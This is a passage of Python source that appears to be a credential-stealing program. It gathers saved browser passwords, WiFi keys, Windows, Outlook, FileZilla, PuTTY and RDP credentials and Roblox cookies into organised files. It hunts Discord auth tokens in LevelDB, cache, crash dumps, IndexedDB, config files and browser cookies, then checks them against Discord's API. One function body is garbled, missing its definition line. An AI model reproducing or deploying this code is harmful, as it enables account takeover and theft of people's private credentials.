                    lines.append(f'Location: {entry.get("url")}')
                if entry.get('username'):
                    lines.append(f'Username: {entry.get("username")}')
                if entry.get('password'):
                    lines.append(f'Password: {entry.get("password")}')
                elif entry.get('token'):
                    lines.append(f'Token: {entry.get("token")}')
                elif entry.get('value'):
                    lines.append(f'Value: {entry.get("value")}')
                lines.append('')
    except:
        pass

    # Add WiFi passwords if available
    try:
        wifi_passwords = get_wifi_passwords()
        if wifi_passwords:
            lines.append('\n--- WIFI PASSWORDS ---')
            for wifi in wifi_passwords:
                lines.append(f'SSID: {wifi.get("ssid", "Unknown")}')
                lines.append(f'Password: {wifi.get("password", "Unknown")}')
                lines.append('')
    except:
        pass

    # Add app passwords if available
    try:
        app_passwords = get_app_passwords()
        if app_passwords:
            lines.append('\n--- APP PASSWORDS ---')
            for app in app_passwords:
                lines.append(f'App: {app.get("app", "Unknown")}')
                lines.append(f'Username: {app.get("username", "N/A")}')
                lines.append(f'Password/Token: {app.get("password", "N/A")}')
                lines.append('')
    except:
        pass

    # Add Windows credentials if available
    try:
        if 'windows_credentials' in other_data and other_data['windows_credentials']:
            windows_credentials = other_data['windows_credentials']
            lines.append('\n--- WINDOWS CREDENTIALS ---')
            for cred in windows_credentials:
                lines.append(f'Target: {cred.get("target", "Unknown")}')
                lines.append(f'Username: {cred.get("username", "Unknown")}')
                lines.append(f'Password: {cred.get("password", "Unknown")}')
                lines.append(f'Type: {cred.get("type", "Unknown")}')
                lines.append('')
    except:
        pass

    # Add Outlook credentials if available
    try:
        if 'outlook_credentials' in other_data and other_data['outlook_credentials']:
            outlook_credentials = other_data['outlook_credentials']
            lines.append('\n--- OUTLOOK CREDENTIALS ---')
            for cred in outlook_credentials:
                lines.append(f'Email: {cred.get("email", "Unknown")}')
                lines.append(f'Profile: {cred.get("profile", "Unknown")}')
                lines.append('')
    except:
        pass

    # Add FileZilla credentials if available
    try:
        if 'filezilla_credentials' in other_data and other_data['filezilla_credentials']:
            filezilla_credentials = other_data['filezilla_credentials']
            lines.append('\n--- FILEZILLA FTP CREDENTIALS ---')
            for cred in filezilla_credentials:
                lines.append(f'Host: {cred.get("host", "Unknown")}')
                lines.append(f'Port: {cred.get("port", "21")}')
                lines.append(f'Username: {cred.get("username", "Unknown")}')
                lines.append(f'Password: {cred.get("password", "Unknown")}')
                lines.append('')
    except:
        pass

    # Add PuTTY credentials if available
    try:
        if 'putty_credentials' in other_data and other_data['putty_credentials']:
            putty_credentials = other_data['putty_credentials']
            lines.append('\n--- PUTTY SSH SESSIONS ---')
            for cred in putty_credentials:
                lines.append(f'Session: {cred.get("session", "Unknown")}')
                lines.append(f'Hostname: {cred.get("hostname", "Unknown")}')
                lines.append(f'Username: {cred.get("username", "Unknown")}')
                lines.append('')
    except:
        pass

    # Add RDP credentials if available
    try:
        if 'rdp_credentials' in other_data and other_data['rdp_credentials']:
            rdp_credentials = other_data['rdp_credentials']
            lines.append('\n--- REMOTE DESKTOP CONNECTIONS ---')
            for cred in rdp_credentials:
                lines.append(f'File: {cred.get("file", "Unknown")}')
                lines.append(f'Hostname: {cred.get("hostname", "Unknown")}')
                lines.append(f'Username: {cred.get("username", "Unknown")}')
                lines.append('')
    except:
        pass

    return '\n'.join(lines)


def sanitize_name_for_path(name):
    try:
        safe = re.sub(r'[^A-Za-z0-9 _\-\.]+', '_', str(name))
        return safe.strip(' ._')[:100]
    except:
        return 'unknown'


def save_credentials_folder_structure(base_dir, discord_data, roblox_data, saved_passwords, browser_history, app_passwords, wifi_passwords, other_data):
    try:
        os.makedirs(base_dir, exist_ok=True)

        if discord_data:
            discord_dir = os.path.join(base_dir, 'Discord')
            os.makedirs(discord_dir, exist_ok=True)
            if discord_data.get('token'):
                with open(os.path.join(discord_dir, 'discord_token.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(discord_data.get('token'))
            if discord_data.get('phone'):
                with open(os.path.join(discord_dir, 'discord_phone.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(str(discord_data.get('phone')))
            with open(os.path.join(discord_dir, 'discord_profile.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(f"Username: {discord_data.get('username', 'Unknown')}\n")
                f.write(f"User ID: {discord_data.get('user_id', 'Unknown')}\n")
                f.write(f"Email: {discord_data.get('email', 'Unknown')}\n")
                f.write(f"Phone: {discord_data.get('phone', 'Unknown')}\n")
                f.write(f"Premium: {discord_data.get('premium', 'Unknown')}\n")

        if roblox_data:
            roblox_dir = os.path.join(base_dir, 'Roblox')
            os.makedirs(roblox_dir, exist_ok=True)
            if roblox_data.get('cookie'):
                with open(os.path.join(roblox_dir, 'roblox_cookie.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(roblox_data.get('cookie'))
            with open(os.path.join(roblox_dir, 'roblox_profile.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write(f"Username: {roblox_data.get('username', 'Unknown')}\n")
                f.write(f"User ID: {roblox_data.get('user_id', 'Unknown')}\n")
                f.write(f"Email: {roblox_data.get('email', 'Unknown')}\n")
                f.write(f"Status: {roblox_data.get('status', 'Unknown')}\n")

        browser_groups = {}
        if saved_passwords:
            for entry in saved_passwords:
                group_name = entry.get('browser') or entry.get('app') or entry.get('service') or 'Unknown'
                group_name = sanitize_name_for_path(group_name)
                folder = os.path.join(base_dir, group_name)
                os.makedirs(folder, exist_ok=True)
                browser_groups.setdefault(folder, []).append(entry)

            for folder, entries in browser_groups.items():
                lines = []
                for entry in entries:
                    lines.append('--- ENTRY ---')
                    if entry.get('url'):
                        lines.append(f"Location: {entry.get('url')}")
                    if entry.get('username'):
                        lines.append(f"Username: {entry.get('username')}")
                    if entry.get('password'):
                        lines.append(f"Password: {entry.get('password')}")
                    if entry.get('token'):
                        lines.append(f"Token: {entry.get('token')}")
                    if entry.get('value'):
                        lines.append(f"Value: {entry.get('value')}")
                    if entry.get('data'):
                        lines.append(f"Data: {entry.get('data')}")
                    lines.append('')
                with open(os.path.join(folder, 'Passwords.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                    f.write('\n'.join(lines))

        if browser_history:
            for entry in browser_history:
                url = entry.get('url', 'Unknown')
                title = entry.get('title', 'Unknown')
                browser_name = 'Google Chrome'
                if 'microsoft' in url.lower() or 'bing' in url.lower():
                    browser_name = 'Microsoft Edge'
                elif 'opera' in url.lower():
                    browser_name = 'Opera'
                elif 'brave' in url.lower():
                    browser_name = 'Brave'
                elif 'firefox' in url.lower() or 'mozilla' in url.lower():
                    browser_name = 'Firefox'
                browser_name = sanitize_name_for_path(browser_name)
                folder = os.path.join(base_dir, browser_name)
                os.makedirs(folder, exist_ok=True)
                history_file = os.path.join(folder, 'History.txt')
                with open(history_file, 'a', encoding='utf-8', errors='ignore') as f:
                    f.write(f"{title} - {url}\n")

        if app_passwords:
            for entry in app_passwords:
                browser_name = sanitize_name_for_path(entry.get('app') or 'AppPasswords')
                folder = os.path.join(base_dir, browser_name)
                os.makedirs(folder, exist_ok=True)
                with open(os.path.join(folder, 'Passwords.txt'), 'a', encoding='utf-8', errors='ignore') as f:
                    if entry.get('username'):
                        f.write(f"Username: {entry.get('username')}\n")
                    if entry.get('password'):
                        f.write(f"Password: {entry.get('password')}\n")
                    if entry.get('token'):
                        f.write(f"Token: {entry.get('token')}\n")
                    if entry.get('value'):
                        f.write(f"Value: {entry.get('value')}\n")
                    if entry.get('url'):
                        f.write(f"Location: {entry.get('url')}\n")
                    f.write('\n')

        if wifi_passwords:
            wifi_dir = os.path.join(base_dir, 'WiFi')
            os.makedirs(wifi_dir, exist_ok=True)
            with open(os.path.join(wifi_dir, 'WiFi_Passwords.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                for wifi in wifi_passwords:
                    f.write(f"SSID: {wifi.get('ssid', 'Unknown')}\n")
                    f.write(f"Password: {wifi.get('password', 'Unknown')}\n\n")

        if other_data:
            if 'windows_credentials' in other_data and other_data['windows_credentials']:
                win_dir = os.path.join(base_dir, 'Windows_Credentials')
                os.makedirs(win_dir, exist_ok=True)
                with open(os.path.join(win_dir, 'credentials.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                    for cred in other_data['windows_credentials']:
                        f.write(f"Target: {cred.get('target', 'Unknown')}\n")
                        f.write(f"Username: {cred.get('username', 'Unknown')}\n")
                        f.write(f"Password: {cred.get('password', 'Unknown')}\n")
                        f.write(f"Type: {cred.get('type', 'Unknown')}\n\n")

            if 'outlook_credentials' in other_data and other_data['outlook_credentials']:
                outlook_dir = os.path.join(base_dir, 'Outlook')
                os.makedirs(outlook_dir, exist_ok=True)
                with open(os.path.join(outlook_dir, 'outlook_credentials.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                    for cred in other_data['outlook_credentials']:
                        f.write(f"Email: {cred.get('email', 'Unknown')}\n")
                        f.write(f"Profile: {cred.get('profile', 'Unknown')}\n\n")
    except Exception:
        pass
    """Hide most of the token for safe embed display."""
    if not token or len(token) < 10:
        return 'HIDDEN'
    prefix = token[:6]
    suffix = token[-6:]
    return f'{prefix}...{suffix}'


def get_wifi_ssid():
    """Get current WiFi SSID/network name and AP info"""
    try:
        ap_info = {'ssid': 'Unknown'}
        if PLATFORM == "Windows":
            result = subprocess.run(['netsh', 'wlan', 'show', 'interface'], 
                                  capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'SSID' in line and ':' in line and 'BSSID' not in line:
                    ssid = line.split(':', 1)[1].strip()
                    if ssid and ssid.lower() != 'off':
                        ap_info['ssid'] = ssid
                if 'BSSID' in line and ':' in line:
                    ap_info['bssid'] = line.split(':', 1)[1].strip()
                if 'Signal' in line and ':' in line:
                    ap_info['signal'] = line.split(':', 1)[1].strip()
        elif PLATFORM == "Darwin":
            result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-I'],
                                  capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'SSID:' in line:
                    ap_info['ssid'] = line.split(':', 1)[1].strip()
                if 'BSSID:' in line:
                    ap_info['bssid'] = line.split(':', 1)[1].strip()
        else:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'SSID' in line:
                    if '"' in line:
                        ap_info['ssid'] = line.split('"')[1]
        return ap_info
    except:
        pass
    return {'ssid': 'Unknown'}

def get_discord_username():
    """Try to extract Discord username from local storage"""
    try:
        if PLATFORM == "Windows":
            for discord_path in get_discord_leveldb_paths():
                for filename in os.listdir(discord_path):
                    filepath = os.path.join(discord_path, filename)
                    if not os.path.isfile(filepath):
                        continue
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            if b'username' not in content.lower():
                                continue
                            import re
                            patterns = [
                                rb'"username":"([^"]+)"',
                                rb'"user"[^"]*"username":"([^"]+)"',
                                rb'"tag":"([0-9]{4})"',
                            ]
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            username = match.decode('utf-8', errors='ignore').strip()
                                        else:
                                            username = str(match).strip()
                                        if username and len(username) > 2:
                                            return username
                    except:
                        pass
    except:
        pass
    return 'Unknown'

def get_discord_indexeddb_paths():
    """Get paths to Discord IndexedDB directories for web app token extraction"""
    paths = []
    if PLATFORM == "Windows":
        base_paths = [
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\IndexedDB\\https_discordapp.com_0.indexeddb.leveldb"),
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\IndexedDB\\https_discordapp.com_0.indexeddb.leveldb"),
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\IndexedDB\\https_discordapp.com_0.indexeddb.leveldb"),
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\IndexedDB\\https_discordapp.com_0.indexeddb.leveldb"),
        ]
    elif PLATFORM == "Darwin":
        base_paths = [
            os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/IndexedDB/https_discordapp.com_0.indexeddb.leveldb"),
            os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/IndexedDB/https_discordapp.com_0.indexeddb.leveldb"),
        ]
    else:
        base_paths = [
            os.path.expanduser("~/.config/google-chrome/Default/IndexedDB/https_discordapp.com_0.indexeddb.leveldb"),
            os.path.expanduser("~/.config/microsoft-edge/Default/IndexedDB/https_discordapp.com_0.indexeddb.leveldb"),
        ]

    for base_path in base_paths:
        if os.path.exists(base_path):
            paths.append(base_path)

    return paths

def is_valid_discord_token(candidate_token):
    """Validate a Discord token candidate by checking it against Discord API."""
    if not candidate_token or not requests:
        return False
    profile = get_discord_profile_from_token(candidate_token)
    if profile and (profile.get('id') or profile.get('username')):
        return True
    return False

def get_discord_token():
    """Extract Discord authentication token from local storage files with comprehensive search."""
    try:
        if PLATFORM == "Windows":
            all_tokens = []
            leveldb_paths = get_discord_leveldb_paths()

            # Comprehensive regex patterns for all token formats including MFA, partial, and encoded
            patterns = [
                # Full MFA tokens (highest priority)
                rb'mfa\.[A-Za-z0-9_-]{84,}',
                # Standard Discord tokens (full capture)
                rb'([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,})(?:==?|%3D%3D?)?',
                # JSON-format tokens (case insensitive)
                rb'(?i)"token"\s*:\s*"([A-Za-z0-9._-]{50,})"',
                rb'(?i)token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
                # Base64 encoded tokens with padding
                rb'([A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,})(==?|%3D%3D?)',
                # Raw tokens without quotes (full capture)
                rb'\b([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,})\b(?:==?|%3D%3D?)?',
                # MFA tokens (full capture)
                rb'mfa\.[A-Za-z0-9_-]{80,}',
                # Tokens in different formats (case insensitive)
                rb'(?i)Authorization["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
                rb'(?i)Bearer\s+([A-Za-z0-9._-]{50,})',
                # Additional patterns for embedded tokens (case insensitive)
                rb'(?i)discord_token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
                rb'(?i)auth_token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
                rb'(?i)session_token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
                # URL encoded tokens
                rb'%([A-Za-z0-9_-]{24})%2E([A-Za-z0-9_-]{6,})%2E([A-Za-z0-9_-]{27,})',
                # Partial token patterns that might be concatenated (for chunked storage)
                rb'([A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{20,})',
                # JWT-like patterns
                rb'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
                # Discord API response cached tokens
                rb'(?i)"access_token"\s*:\s*"([A-Za-z0-9._-]{50,})"',
                # Webhook stored tokens
                rb'(?i)"webhook_url"\s*:\s*"https://discord(?:app)?\.com/api/webhooks/(\d+)/([A-Za-z0-9_-]+)"',
            ]

            for location in leveldb_paths:
                if not os.path.exists(location):
                    continue

                try:
                    # Search through ALL files in leveldb folder (.ldb, .log, .db, .sst, etc.)
                    for filename in os.listdir(location):
                        filepath = os.path.join(location, filename)
                        if not os.path.isfile(filepath):
                            continue

                        # Skip LOCK files that are often locked
                        if filename == 'LOCK':
                            continue

                        # Explicitly include .db, .ldb, .log files
                        if not filename.endswith(('.db', '.ldb', '.log', '.sst', '.tmp')):
                            continue

                        try:
                            with open(filepath, 'rb') as f:
                                content = f.read()

                                # Try different decodings
                                try:
                                    text_content = content.decode('utf-8', errors='ignore')
                                except:
                                    text_content = ""

                                # Search with all patterns
                                for pattern in patterns:
                                    # Search in raw binary data
                                    binary_matches = re.findall(pattern, content)
                                    if binary_matches:
                                        for match in binary_matches:
                                            if isinstance(match, tuple):
                                                # Handle URL encoded tokens
                                                if len(match) == 3 and '%' in str(match[0]):
                                                    token = '.'.join(match)
                                                else:
                                                    token = match[0] if match else str(match)
                                            else:
                                                token = str(match)

                                            token = token.strip()
                                            # URL decode if needed
                                            if '%' in token:
                                                import urllib.parse
                                                token = urllib.parse.unquote(token)
                                            # Clean extra characters
                                            token = token.strip('"\'')
                                            token = token.strip()

                                            if is_potential_discord_token(token):
                                                all_tokens.append(token)

                                    # Also search in text content if available
                                    if text_content:
                                        text_matches = re.findall(pattern.decode('utf-8') if isinstance(pattern, bytes) else pattern, text_content)
                                        for match in text_matches:
                                            if isinstance(match, tuple):
                                                if len(match) == 3 and '%' in str(match[0]):
                                                    token = '.'.join(match)
                                                else:
                                                    token = match[0] if match else str(match)
                                            else:
                                                token = str(match)

                                            token = token.strip('"\'')
                                            token = token.strip()
                                            # URL decode if needed
                                            if '%' in token:
                                                import urllib.parse
                                                token = urllib.parse.unquote(token)
                                            token = token.strip()

                                            if is_potential_discord_token(token):
                                                all_tokens.append(token)

                        except Exception as e:
                            continue

                except Exception as e:
                    pass

            # Also search in other Discord-related folders
            additional_paths = [
                os.path.expanduser("~\\AppData\\Roaming\\discord\\Cache"),
                os.path.expanduser("~\\AppData\\Local\\Discord\\Cache"),
                os.path.expanduser("~\\AppData\\Roaming\\discord\\Code Cache"),
                os.path.expanduser("~\\AppData\\Local\\Discord\\Code Cache"),
                # Add minidump paths
                os.path.expanduser("~\\AppData\\Local\\Discord\\Crashpad"),
                os.path.expanduser("~\\AppData\\Local\\DiscordCanary\\Crashpad"),
                os.path.expanduser("~\\AppData\\Local\\DiscordPTB\\Crashpad"),
            ]

            for path in additional_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.dat', '.cache', '.tmp', '.db', '.ldb', '.log', '.dmp')):
                                    filepath = os.path.join(root, file)
                                    try:
                                        with open(filepath, 'rb') as f:
                                            content = f.read(1024*1024)  # Read only first MB
                                            for pattern in patterns:
                                                matches = re.findall(pattern, content)
                                                for match in matches:
                                                    if isinstance(match, tuple):
                                                        if len(match) == 3 and '%' in str(match[0]):
                                                            token = '.'.join(match)
                                                        else:
                                                            token = match[0] if match else str(match)
                                                    else:
                                                        token = str(match)

                                                    token = token.strip('"\'')
                                                    token = token.strip()
                                                    # URL decode if needed
                                                    if '%' in token:
                                                        import urllib.parse
                                                        token = urllib.parse.unquote(token)
                                                    token = token.strip()

                                                    if is_potential_discord_token(token):
                                                        all_tokens.append(token)
                                    except:
                                        continue
                    except:
                        continue

            # Search IndexedDB for Discord web app data
            indexeddb_paths = get_discord_indexeddb_paths()
            for path in indexeddb_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if file.endswith(('.log', '.ldb', '.db', '.sst')):
                                    filepath = os.path.join(root, file)
                                    try:
                                        with open(filepath, 'rb') as f:
                                            content = f.read(1024*1024)
                                            for pattern in patterns:
                                                matches = re.findall(pattern, content)
                                                for match in matches:
                                                    if isinstance(match, tuple):
                                                        if len(match) == 3 and '%' in str(match[0]):
                                                            token = '.'.join(match)
                                                        else:
                                                            token = match[0] if match else str(match)
                                                    else:
                                                        token = str(match)

                                                    token = token.strip('"\'')
                                                    token = token.strip()
                                                    if '%' in token:
                                                        import urllib.parse
                                                        token = urllib.parse.unquote(token)
                                                    token = token.strip()

                                                    if is_potential_discord_token(token):
                                                        all_tokens.append(token)
                                    except:
                                        continue
                    except:
                        continue

            if all_tokens:
                # Remove duplicates but don't filter too early - keep all potential tokens
                unique_tokens = list(set(all_tokens))

                # Sort by score and length, but validate all
                scored_tokens = [(token, score_discord_token_candidate(token)) for token in unique_tokens]
                scored_tokens.sort(key=lambda x: (x[1], len(x[0])), reverse=True)

                # Try to validate each token against Discord API (with retry and timeout)
                if requests:
                    for token, score in scored_tokens:
                        if is_valid_discord_token(token):
                            return token

                # If no token was validated, return the highest scored candidate
                return scored_tokens[0][0]

            # If no tokens found in LevelDB, try advanced methods
            advanced_tokens = get_discord_tokens_advanced()
            if advanced_tokens:
                return advanced_tokens[0]
    except Exception as e:
        pass

    # Fallback: try browser localStorage
    return get_discord_token_from_browser()

def get_discord_tokens_advanced():
    """Advanced token extraction from config files and other sources - includes all Discord variants"""
    tokens = []
    try:
        # Search in Discord config files - cross-platform
        config_paths = []
        
        if PLATFORM == "Windows":
            config_paths = [
                os.path.expanduser("~\\AppData\\Roaming\\discord\\settings.json"),
                os.path.expanduser("~\\AppData\\Roaming\\discordptb\\settings.json"),
                os.path.expanduser("~\\AppData\\Roaming\\discordcanary\\settings.json"),
                os.path.expanduser("~\\AppData\\Roaming\\discorddevelopment\\settings.json"),
            ]
            # Find all Discord app versions
            discord_local = os.path.expanduser("~\\AppData\\Local\\Discord")
            if os.path.exists(discord_local):
                for item in os.listdir(discord_local):
                    if item.startswith("app-"):
                        config_paths.append(os.path.join(discord_local, item, "settings.json"))
            
            # Same for PTB, Canary, Development
            for variant in ["DiscordPTB", "DiscordCanary", "DiscordDevelopment"]:
                variant_local = os.path.join(os.path.expanduser("~"), "AppData", "Local", variant)
                if os.path.exists(variant_local):
                    for item in os.listdir(variant_local):
                        if item.startswith("app-"):
                            config_paths.append(os.path.join(variant_local, item, "settings.json"))
        elif PLATFORM == "Darwin":  # macOS
            config_paths = [
                os.path.expanduser("~/Library/Application Support/discord/settings.json"),
                os.path.expanduser("~/Library/Application Support/discordptb/settings.json"),
                os.path.expanduser("~/Library/Application Support/discordcanary/settings.json"),
                os.path.expanduser("~/Library/Application Support/discorddevelopment/settings.json"),
            ]
        else:  # Linux/Chrome OS
            config_paths = [
                os.path.expanduser("~/.config/discord/settings.json"),
                os.path.expanduser("~/.config/discordptb/settings.json"),
                os.path.expanduser("~/.config/discordcanary/settings.json"),
                os.path.expanduser("~/.config/discorddevelopment/settings.json"),
            ]
        
        patterns = [
            r'mfa\.[A-Za-z0-9_-]{84,}',
            r'([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,})',
            r'"token"\s*:\s*"([A-Za-z0-9._-]{50,})"',
            r'token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
            r'Authorization["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
            r'Bearer\s+([A-Za-z0-9._-]{50,})',
        ]
        
        for config_path in config_paths:
            if os.path.exists(config_path):
                try:
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        
                        # Try JSON parsing first
                        try:
                            data = json.loads(content)
                            token = extract_token_from_json(data)
                            if token and is_potential_discord_token(token):
                                tokens.append(token)
                        except json.JSONDecodeError:
                            pass  # Fall back to regex
                        
                        # Regex search
                        for pattern in patterns:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                token = str(match).strip('"\'')
                                if is_potential_discord_token(token):
                                    tokens.append(token)
                except:
                    continue
                    
    except Exception as e:
        pass
    
    return sorted(set(tokens), key=score_discord_token_candidate, reverse=True)  # Return unique tokens with highest ranked first

def extract_token_from_json(data):
    """Recursively extract token from JSON data structure"""
    if isinstance(data, dict):
        for key, value in data.items():
            if key.lower() in ['token', 'auth_token', 'discord_token', 'session_token', 'authorization']:
                if isinstance(value, str) and value:
                    return value
            elif isinstance(value, (dict, list)):
                result = extract_token_from_json(value)
                if result:
                    return result
    elif isinstance(data, list):
        for item in data:
            result = extract_token_from_json(item)
            if result:
                return result
    return None

def is_potential_discord_token(token):
    """Check if a string looks like a potential Discord token."""
    if not token or len(token) < 50:
        return False

    # Kontrollera format
    if token.startswith('mfa.'):
        return len(token) >= 88  # MFA tokens är längre
    elif '.' in token:
        parts = token.split('.')
        if len(parts) == 3:
            # Kontrollera att varje del ser ut som base64
            for part in parts:
                if len(part) < 20:
                    continue
                # Kontrollera att det innehåller giltiga tecken
                if not all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_' for c in part):
                    return False
            return True

    return False


def score_discord_token_candidate(token):
    """Rank Discord token candidates so the most likely token is selected first."""
    if not token:
        return 0

    score = 0
    if token.startswith('mfa.'):
        score += 150  # Higher for MFA tokens

    if '.' in token:
        parts = token.split('.')
        if len(parts) == 3:
            score += 50
            if len(parts[0]) == 24:
                score += 20
            if 6 <= len(parts[1]) <= 10:
                score += 15
            if 27 <= len(parts[2]) <= 80:
                score += 15
            if all(re.fullmatch(r'[A-Za-z0-9_-]+', part) for part in parts):
                score += 25

    if token.startswith('eyJ'):
        score += 10
    if token.endswith('=='):
        score += 5

    # Prefer tokens that look like JWT (Discord uses JWT-like format)
    if len(token) > 50:
        score += 10

    score += min(len(token), 100) // 2
    return score


def get_discord_token_from_browser():
    """Extract Discord token from browser localStorage (Chrome/Edge) with comprehensive search."""
    try:
        browsers = []
        if PLATFORM == "Windows":
            browsers = [
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
                "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb",
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb",
                "~\\AppData\\Local\\Mozilla\\Firefox\\Profiles",
            ]
        elif PLATFORM == "Darwin":
            browsers = [
                "~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb",
                "~/Library/Application Support/Microsoft Edge/Default/Local Storage/leveldb",
                "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
                "~/Library/Application Support/Firefox/Profiles",
            ]
        else:
            browsers = [
                "~/.config/google-chrome/Default/Local Storage/leveldb",
                "~/.config/microsoft-edge/Default/Local Storage/leveldb",
                "~/.config/chromium/Default/Local Storage/leveldb",
                "~/.mozilla/firefox",
            ]

        all_tokens = []

        # Utökade patterns för browser storage
        patterns = [
            rb'token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
            rb'"token"\s*:\s*"([A-Za-z0-9._-]{50,})"',
            rb'mfa\.[A-Za-z0-9_-]{84,}',
            rb'([A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,})',
            rb'Authorization["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
            rb'Bearer\s+([A-Za-z0-9._-]{50,})',
            rb'discord_token["\s]*:\s*["\']([A-Za-z0-9._-]{50,})["\']',
        ]

        for browser_path in browsers:
            leveldb_path = os.path.expanduser(browser_path)
            if os.path.exists(leveldb_path):
                try:
                    # För Firefox, sök i profile-mappar
                    if 'Firefox' in browser_path:
                        for profile_dir in os.listdir(leveldb_path):
                            profile_path = os.path.join(leveldb_path, profile_dir)
                            if os.path.isdir(profile_path):
                                webapps_path = os.path.join(profile_path, 'webappsstore.sqlite')
                                if os.path.exists(webapps_path):
                                    try:
                                        import sqlite3
                                        conn = sqlite3.connect(webapps_path)
                                        cursor = conn.cursor()
                                        cursor.execute("SELECT key, value FROM webappsstore2 WHERE key LIKE '%discord%'")
                                        for row in cursor.fetchall():
                                            key, value = row
                                            if isinstance(value, bytes):
                                                value = value.decode('utf-8', errors='ignore')
                                            for pattern in patterns:
                                                if isinstance(pattern, bytes):
                                                    pattern_str = pattern.decode('utf-8')
                                                else:
                                                    pattern_str = pattern
                                                matches = re.findall(pattern_str, value)
                                                for match in matches:
                                                    token = str(match).strip('"\'')
                                                    if is_potential_discord_token(token):
                                                        all_tokens.append(token)
                                        conn.close()
                                    except:
                                        continue
                    else:
                        # För Chrome/Edge/Brave/Chromium leveldb
                        for filename in os.listdir(leveldb_path):
                            if filename.endswith('.ldb') or filename.endswith('.log'):
                                filepath = os.path.join(leveldb_path, filename)
                                try:
                                    with open(filepath, 'rb') as f:
                                        content = f.read()
                                        for pattern in patterns:
                                            matches = re.findall(pattern, content)
                                            for match in matches:
                                                if isinstance(match, bytes):
                                                    token = match.decode('utf-8', errors='ignore').strip('"\'')
                                                else:
                                                    token = str(match).strip('"\'')

                                                if is_potential_discord_token(token):
                                                    all_tokens.append(token)
                                except Exception:
                                    pass
                except Exception:
                    pass

        # Sök också i cookies för Discord.com
        cookie_paths = []
        if PLATFORM == "Windows":
            cookie_paths = [
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
                "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies",
            ]
        elif PLATFORM == "Darwin":
            cookie_paths = [
                "~/Library/Application Support/Google/Chrome/Default/Cookies",
                "~/Library/Application Support/Microsoft Edge/Default/Cookies",
                "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies",
            ]
        else:
            cookie_paths = [
                "~/.config/google-chrome/Default/Cookies",
                "~/.config/microsoft-edge/Default/Cookies",
                "~/.config/chromium/Default/Cookies",
            ]

        for cookie_path in cookie_paths:
            cookie_file = os.path.expanduser(cookie_path)
            if os.path.exists(cookie_file):
                try:
                    import sqlite3
                    conn = sqlite3.connect(cookie_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%discord.com%'")
                    for row in cursor.fetchall():
                        name, value = row
                        if 'token' in name.lower():
                            if is_potential_discord_token(value):
                                all_tokens.append(value)
                    conn.close()
                except:
                    continue

        if all_tokens:
            valid_tokens = sorted(set(all_tokens), key=lambda t: (score_discord_token_candidate(t), len(t)), reverse=True)
            if requests:
                for candidate in valid_tokens:
                    if is_valid_discord_token(candidate):
                        return candidate
            return valid_tokens[0]  # Returnera den högst rankade kandidaten om ingen verifierades
    except Exception:
        pass

    return None

